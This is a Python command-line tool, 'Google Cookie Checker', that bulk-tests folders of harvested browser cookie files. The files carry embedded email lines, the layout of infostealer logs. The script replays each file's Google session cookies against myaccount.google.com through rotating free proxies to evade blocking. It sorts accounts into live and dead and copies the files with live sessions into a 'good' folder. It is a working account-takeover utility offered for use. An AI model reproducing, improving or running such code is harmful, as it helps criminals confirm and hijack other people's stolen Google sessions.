#!/usr/bin/env python3
import os, sys, re, glob, json, time, shutil
import requests
from colorama import init, Fore, Style

init(autoreset=True)

HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

PROXY_SOURCES = [
    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt',
]


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.BLUE + Style.BRIGHT + r'''
  ▄████  ██▓     ██▓     ██▓    ▄▄▄       ▄████▄   ▄████▄
 ██▒ ▀█▒▓██▒    ▓██▒    ▓██▒   ▒████▄    ▒██▀ ▀█  ▒██▀ ▀█
▒██░▄▄▄░▒██░    ▒██░    ▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄
░▓█  ██▓▒██░    ▒██░    ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
░▒▓███▀▒░██████▒░██████▒░██████▒▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░
 ░▒   ▒ ░ ▒░▓  ░░ ▒░▓  ░░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░
  ░   ░ ░ ░ ▒  ░░ ░ ▒  ░░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒    ░  ▒
░ ░   ░   ░ ░     ░ ░     ░ ░     ░   ▒   ░       ░
      ░     ░  ░    ░  ░    ░  ░      ░  ░░ ░     ░ ░
                                            ░ ░
                        Google Cookie Checker''' + Fore.BLUE + Style.DIM + '''
                                 github: n5za''' + Style.RESET_ALL)


def parse_cookie_file(path):
    cookies = {}
    email = plan = None
    with open(path, 'r', errors='ignore') as f:
        for raw in f:
            line = raw.strip()
            if 'Email:' in line:
                email = line.split(':', 1)[1].strip()
            if len(line) > 10 and 'google' in line:
                parts = [p.strip() for p in line.split('\t')]
                if len(parts) >= 7:
                    cookies[parts[5]] = parts[6]
    basename = os.path.basename(path).replace('.txt', '')
    m = re.findall(r'\[(.*?)\]', basename)
    email = email or (m[-1] if m else basename)
    return email, cookies


def check_google(cookies, proxy=None):
    s = requests.Session()
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    s.cookies.update(cookies)
    try:
        r = s.get('https://myaccount.google.com/', headers=HEADERS, timeout=20, allow_redirects=True)
        if 'myaccount.google.com' in r.url:
            return 'GOOD', 'signed in'
        elif 'ServiceLogin' in r.url or 'signin' in r.url.lower():
            return 'DEAD', 'redirected to login'
        else:
            return 'DEAD', r.url[:60]
    except Exception as e:
        return 'ERROR', str(e)[:50]


def fetch_free_proxies():
    seen = set()
    proxies = []
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            for line in r.text.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                p = line.replace('http://', '').replace('https://', '')
                if p not in seen:
                    seen.add(p)
                    proxies.append(f'http://{p}')
        except Exception:
            pass
    return proxies


class ProxyRotator:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.idx = 0

    def next(self):
        if not self.proxies:
            return None
        p = self.proxies[self.idx % len(self.proxies)]
        self.idx += 1
        return p


def progress_bar(current, total, bar_len=30):
    filled_len = int(bar_len * current // total) if total else 0
    bar = Fore.GREEN + '█' * filled_len + Fore.WHITE + '░' * (bar_len - filled_len) + Style.RESET_ALL
    pct = f'{current/total*100:.0f}%' if total else '?'
    return f'[{bar}] {pct}'


def main():
    banner()

    args = sys.argv[1:]
    COOKIES_DIR = None
    auto_proxy = True
    proxy_file = None

    i = 0
    while i < len(args):
        a = args[i]
        if a == '--no-proxy':
            auto_proxy = False
        elif a == '--proxy-file' and i + 1 < len(args):
            proxy_file = args[i + 1]
            i += 1
        elif a.startswith('--'):
            pass
        elif COOKIES_DIR is None:
            COOKIES_DIR = a
        i += 1

    if not COOKIES_DIR:
        print(Fore.CYAN + '📁 Enter cookies folder path:' + Style.RESET_ALL)
        COOKIES_DIR = input(Fore.YELLOW + '  > ' + Style.RESET_ALL).strip()
        if not COOKIES_DIR:
            print(Fore.RED + '❌ No path provided.' + Style.RESET_ALL)
            sys.exit(1)

    BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'results-google')
    folder_name = os.path.basename(os.path.normpath(COOKIES_DIR))
    OUTPUT_DIR = os.path.join(BASE_DIR, folder_name)
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # ── PROXY SETUP ──
    rotator = ProxyRotator()
    if auto_proxy and not proxy_file:
        print(Fore.CYAN + '\n🌐 Fetching free proxies...' + Style.RESET_ALL)
        proxies = fetch_free_proxies()
        if proxies:
            rotator = ProxyRotator(proxies)
            print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies' + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + '   ⚠ No proxies found, using direct IP' + Style.RESET_ALL)
    elif proxy_file:
        if os.path.isfile(proxy_file):
            with open(proxy_file) as f:
                proxies = [f'http://{l.strip()}' for l in f if l.strip()]
            if proxies:
                rotator = ProxyRotator(proxies)
                print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies from {proxy_file}' + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + '   ⚠ Proxy file empty, using direct IP' + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + f'   ⚠ File not found: {proxy_file}, using direct IP' + Style.RESET_ALL)

    # ── LOAD FILES ──
    files = sorted(glob.glob(os.path.join(COOKIES_DIR, '*.txt')))
    if not files:
        print(Fore.RED + f'\n❌ No .txt files found in: {COOKIES_DIR}' + Style.RESET_ALL)
        sys.exit(1)

    print(Fore.CYAN + f'\n📊 Loaded {len(files)} cookie files' + Style.RESET_ALL)
    print(Fore.CYAN + f'📁 Output: {OUTPUT_DIR}' + Style.RESET_ALL)
    print(Fore.CYAN + '─' * 55 + Style.RESET_ALL)
    time.sleep(0.5)

    # ── FILES ──
    good_file = os.path.join(OUTPUT_DIR, 'good_alive.txt')
    dead_file = os.path.join(OUTPUT_DIR, 'dead.txt')
    good_dir = os.path.join(OUTPUT_DIR, 'good_cookies')
    os.makedirs(good_dir, exist_ok=True)

    stats = {'good': 0, 'dead': 0, 'error': 0, 'proxy_switches': 0}
    t0 = time.time()

    for i, fpath in enumerate(files):
        email, cookies = parse_cookie_file(fpath)

        if not cookies:
            with open(dead_file, 'a') as f:
                f.write(f'{os.path.basename(fpath).replace(".txt","")} | no Google cookies\n')
            stats['error'] += 1
            continue

        proxy = rotator.next()
        max_retries = 3 if proxy else 1
        status = reason = None
        for attempt in range(max_retries):
            status, reason = check_google(cookies, proxy)
            if status != 'ERROR':
                break
            proxy = rotator.next()
            stats['proxy_switches'] += 1

        label = os.path.basename(fpath).replace('.txt', '')
        line = f'{label} | Email: {email}'

        if status == 'GOOD':
            stats['good'] += 1
            with open(good_file, 'a') as f:
                f.write(line + '\n')
            shutil.copy2(fpath, os.path.join(good_dir, os.path.basename(fpath)))
            print(Fore.GREEN + Style.BRIGHT + f'  ✅ #{stats["good"]:>3} GOOD  | {str(email):40s}' + Style.RESET_ALL, flush=True)
        elif status == 'DEAD':
            stats['dead'] += 1
            with open(dead_file, 'a') as f:
                f.write(line + f' | {reason}\n')
            print(Fore.YELLOW + f'     DEAD  | {str(email):40s}' + Style.RESET_ALL)
        else:
            stats['error'] += 1
            with open(dead_file, 'a') as f:
                f.write(line + f' | {status}: {reason}\n')
            print(Fore.RED + f'     ERROR | {str(email):40s}' + Style.RESET_ALL)

        # ── PROGRESS ──
        if (i + 1) % 25 == 0 or i == len(files) - 1:
            elapsed = time.time() - t0
            rate = (i + 1) / elapsed * 60 if elapsed > 0 else 0
            remaining = (len(files) - i - 1) / max(rate, 0.1) if rate > 0 else 0
            bar = progress_bar(i + 1, len(files))
            print(Fore.WHITE + Style.DIM + f'  {bar}  [{i+1}/{len(files)}]  '
                  f'{Fore.GREEN}✅{stats["good"]}{Fore.WHITE}  '
                  f'{Fore.YELLOW}💀{stats["dead"]}{Fore.WHITE}  '
                  f'{Fore.MAGENTA}!{stats["error"]}{Fore.WHITE}  '
                  f'{rate:.0f}/min  ETA: {remaining:.0f}s  '
                  f'{Fore.CYAN}🔄{stats["proxy_switches"]}{Fore.WHITE}' + Style.RESET_ALL, flush=True)

    # ── SUMMARY ──
    elapsed = time.time() - t0
    print()
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + '  ✅ CHECK COMPLETE' + Style.RESET_ALL)
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)
    print(Fore.GREEN + Style.BRIGHT + f'  ✅ GOOD (alive)   : {stats["good"]}' + Style.RESET_ALL)
    print(Fore.YELLOW + f'  💀 DEAD            : {stats["dead"]}' + Style.RESET_ALL)
    print(Fore.RED + f'  ❌ ERROR           : {stats["error"]}' + Style.RESET_ALL)
    print(Fore.WHITE + f'  ⏱ Time            : {elapsed:.0f}s ({elapsed/60:.1f}min)' + Style.RESET_ALL)
    print(Fore.WHITE + f'  ⚡ Rate            : {len(files)/elapsed*60:.0f} accounts/min' + Style.RESET_ALL)
    if rotator.proxies:
        print(Fore.CYAN + f'  🔄 Proxy switches   : {stats["proxy_switches"]}' + Style.RESET_ALL)
        print(Fore.CYAN + f'  🌐 Proxies loaded   : {len(rotator.proxies)}' + Style.RESET_ALL)
    print()
    print(Fore.CYAN + f'  📁 GOOD list : {OUTPUT_DIR}/good_alive.txt' + Style.RESET_ALL)
    print(Fore.CYAN + f'  📁 GOOD files : {good_dir}/' + Style.RESET_ALL)
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)


if __name__ == '__main__':
    main()
